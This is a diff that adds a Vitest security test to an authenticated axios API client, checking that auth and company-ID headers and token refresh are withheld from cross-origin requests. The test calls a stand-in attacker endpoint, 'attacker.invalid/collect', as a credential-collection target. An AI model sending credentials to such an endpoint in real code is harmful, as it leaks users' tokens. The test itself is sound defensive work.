@@ -60,4 +60,37 @@ describe("authenticated API client", () => {
     ).rejects.toBeInstanceOf(AxiosError);
     expect(clear).toHaveBeenCalledOnce();
   });
+
+  it("never sends ACP credentials to or refreshes for another origin", async () => {
+    const refresh = vi.fn().mockResolvedValue("renewed-token");
+    configureAuthentication({
+      getAccessToken: () => "access-token",
+      getActiveCompanyId: () => "company-1",
+      refresh,
+      clear: vi.fn(),
+    });
+
+    await expect(
+      apiClient.get("https://attacker.invalid/collect", {
+        adapter: async (config) => {
+          expect(config.headers.get("Authorization")).toBeUndefined();
+          expect(config.headers.get("X-Company-ID")).toBeUndefined();
+          throw new AxiosError(
+            "Unauthorized",
+            AxiosError.ERR_BAD_REQUEST,
+            config,
+            undefined,
+            {
+              data: {},
+              status: 401,
+              statusText: "Unauthorized",
+              headers: new AxiosHeaders(),
+              config,
+            },
+          );
+        },
+      }),
+    ).rejects.toBeInstanceOf(AxiosError);
+    expect(refresh).not.toHaveBeenCalled();
+  });
 });
